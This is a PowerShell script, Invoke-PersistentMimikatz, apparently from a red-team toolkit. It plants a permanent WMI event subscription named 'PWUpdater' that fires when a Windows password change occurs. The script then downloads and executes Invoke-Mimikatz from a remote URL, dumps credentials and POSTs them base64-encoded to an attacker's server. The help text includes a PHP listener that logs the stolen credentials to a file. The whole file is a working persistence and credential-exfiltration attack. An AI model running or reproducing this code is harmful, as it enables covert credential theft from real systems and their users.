function Invoke-PersistentMimikatz {
<#
.SYNOPSIS

    Creates WMI listener to Invoke-Mimikatz when password change is attempted.

    WMI Event Listener based on PowerSploit's New-ElevatedPersistenceOption. See research and talks from @mattifestation for more.
    Author: Leo Loobeek
    Required Dependencies: None
    Optional Dependencies: None
 
.DESCRIPTION

    Invoke-PersistentMimikatz creates a permanent WMI listener which waits for a password change event (4723). Once this event occurs it will download Invoke-Mimikatz.ps1, base64 encode the output, and send it as POST data to a URL of choice.
	
	Note: This does require Administrator privileges.

.PARAMETER Destination

    The listening web server page that will accept raw POST data and base64 decode it. Below is PHP code that will accept and decode the POST data.

	<?php
		$creds = file_get_contents('php://input');
		$timedate=date("Y M d H:i:s");
		$output = chop(base64_decode($creds));

		if ( $handle = fopen("credentials.txt", "a")){
			fwrite($handle, $timedate . "\n\n" . $output . "\n\n\n");
		}
	?>
	
.PARAMETER Mimikatz

    The URL that is hosting the Invoke-Mimikatz PowerShell script.

.PARAMETER Remove

    Removes all three WMI (filter, consumer, binding) objects created for Persistent Mimikatz. 

.EXAMPLE

    C:\PS> Invoke-PersistentMimikatz -Destination https://10.0.0.1 -Mimikatz https://10.0.0.1/Invoke-Mimikatz2.ps1 

.EXAMPLE

    C:\PS> Invoke-PersistentMimikatz -Remove

#>

	[CmdletBinding()] Param (
		
		
		[Parameter( ParameterSetName = 'Create' )]
		[string] $Destination,
		
		[Parameter( ParameterSetName = 'Create',
					Mandatory = $True )]
		[string] $Mimikatz,
	   
		[Parameter( ParameterSetName = 'Remove' )]
		[switch] $Remove
	)

	if($Remove){

		try {
			Get-WmiObject __eventFilter -namespace root\subscription -filter "name='PWUpdater'"| Remove-WmiObject
			Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='PWUpdater'" | Remove-WmiObject
			Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match 'PWUpdater'} | Remove-WmiObject
		}
		catch{ }
	}
	else {
		$Filter=Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{ name='PWUpdater';
			EventNameSpace='root\CimV2';
			QueryLanguage="WQL";
			Query="SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = 4723"}
		$Consumer=Set-WmiInstance -Namespace root\subscription -Class 'CommandLineEventConsumer' -Arguments @{ name='PWUpdater';
			CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -Exec Bypass -Command `"`$a = '$Destination'; `$b = '$Mimikatz'; (New-Object Net.WebClient).UploadString(`$a,`$([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$(iex(New-Object Net.WebClient).DownloadString(`$b); Invoke-Mimikatz -DumpCreds)))))`"";
			RunInteractively='false'}
		Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null

	}



}
